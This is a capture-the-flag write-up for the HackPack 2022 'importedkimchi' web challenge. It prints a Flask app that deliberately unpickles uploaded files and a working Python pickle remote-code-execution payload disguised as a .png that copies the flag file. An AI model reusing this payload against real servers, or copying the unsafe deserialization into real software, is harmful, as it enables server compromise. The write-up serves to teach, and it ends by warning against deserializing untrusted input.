---
title: /writeups/ctf/hackpack-2022/importedkimchi
layout: post
permalink: /writeups/ctf/hackpack-2022/importedkimchi
---

They give the source code of the webapp in challenge so lets take a look at it.
```
import uuid
from flask import *
from flask_bootstrap import Bootstrap
import pickle
import os

app = Flask(__name__)
Bootstrap(app)

app.secret_key = 'sup3r s3cr3t k3y'

ALLOWED_EXTENSIONS = set(['png', 'jpg', 'jpeg'])

images = set()
images.add('bibimbap.jpg')
images.add('galbi.jpg')
images.add('pickled_kimchi.jpg')

@app.route('/')
def index():
    return render_template("index.html", images=images)

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST':
        image = request.files["image"]
        if image and image.filename.split(".")[-1].lower() in ALLOWED_EXTENSIONS:
            # special file names are fun!
            extension = "." + image.filename.split(".")[-1].lower()
            fancy_name = str(uuid.uuid4()) + extension

            image.save(os.path.join('./images', fancy_name))
            flash("Successfully uploaded image! View it at /images/" + fancy_name, "success")
            return redirect(url_for('upload'))

        else:
            flash("An error occured while uploading the image! Support filetypes are: png, jpg, jpeg", "danger")
            return redirect(url_for('upload'))

    else:
        return render_template("upload.html")

@app.route('/images/<filename>')
def display_image(filename):
    try:
        pickle.loads(open('./images/' + filename, 'rb').read())
    except:
        pass
    return send_from_directory('./images', filename)

if __name__ == "__main__":
    app.run(host='0.0.0.0')
```
So, the website allows you to upload an image, and then it stores it in the "images/" directory with a random name.

You're only allowed to post .png, .jpg, and .jpeg files.
It determines the file type by the file name, and not by the contents of the file.
This means that so long as it ends in the above extensions it will allow the upload.

Let's also take a look at the "display_image" function.
When you try to go to an image in the images/ directory, it will try to unpickle the file, and regardless of whether the "pickle.loads" returns anything, will redirect you to the image.

What is pickling?

If you're familiar with PHP, pickling is the same as serialize/unserialize. More info can be found in the [docs](https://docs.python.org/3/library/pickle.html)

However, unpickling user input is very dangerous, as when something is unpickled, it is executed immediately.

The game plan for attack is to write serialized data to a file, upload it, then access the file, causing our code to be executed on the server.

For this I created a script to cat the flag.txt into an arbitrary file in the images directory. With special help from [SecureFlag](https://knowledge-base.secureflag.com/vulnerabilities/unsafe_deserialization/unsafe_deserialization_python.html) :)
```
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ("cat flag.txt > images/flaggerino")
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    with open('exploit.png', 'wb') as file:
        file.write(pickled)
```

If we upload the png, then go to /images/flaggerino, we'll get the flag!

Moral of the story, DON'T UNSERIALIZE UNSANITIZED USER INPUT!!!!
